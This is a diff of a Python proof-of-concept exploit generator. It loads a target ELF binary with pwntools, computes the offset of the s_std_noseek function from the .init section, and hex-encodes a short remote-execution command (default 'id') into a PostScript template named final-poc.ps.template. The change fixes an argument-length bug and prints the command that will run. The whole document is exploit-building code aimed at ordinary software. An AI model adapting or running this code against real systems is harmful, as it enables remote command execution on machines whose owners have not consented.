@@ -15,14 +15,15 @@ if len(argv) < 2:
 
 elf_path = argv[1]
 
-if len(argv > 2):
-    rce = argv[2].encode()
+if len(argv) > 2:
+    rce_cmd = argv[2]
+    rce = rce_cmd.encode()
     if len(rce) > 7 or len(rce) == 0:
         print("Invalid rce command: improper length; 0 < len(rce.encode()) < 8")
         exit(2)
-    rce = rce.ljust(8, b'\0').hex()
 else:
-    rce = 'id'.encode().ljust(8, b'\0').hex()
+    rce_cmd = 'id'
+rce = rce_cmd.encode().ljust(8, b'\0').hex()
 
 # Load the ELF file
 elf = ELF(elf_path)
@@ -41,6 +42,8 @@ f_addr_s_std_noseek = elf.functions["s_std_noseek"]
 print("f_addr_s_std_noseek address: 0x{:x}".format(f_addr_s_std_noseek.address))
 f_addr_s_std_noseek_offset = f_addr_s_std_noseek.address - init_addr
 print("Offset from .init start addr to f_addr_s_std_noseek: 0x{:x} == {:d}".format(f_addr_s_std_noseek_offset, f_addr_s_std_noseek_offset))
+
+print("The command to execute is: {}".format(rce_cmd))
 
 with open("final-poc.ps.template", "r") as f:
     final_file = f.read().strip()
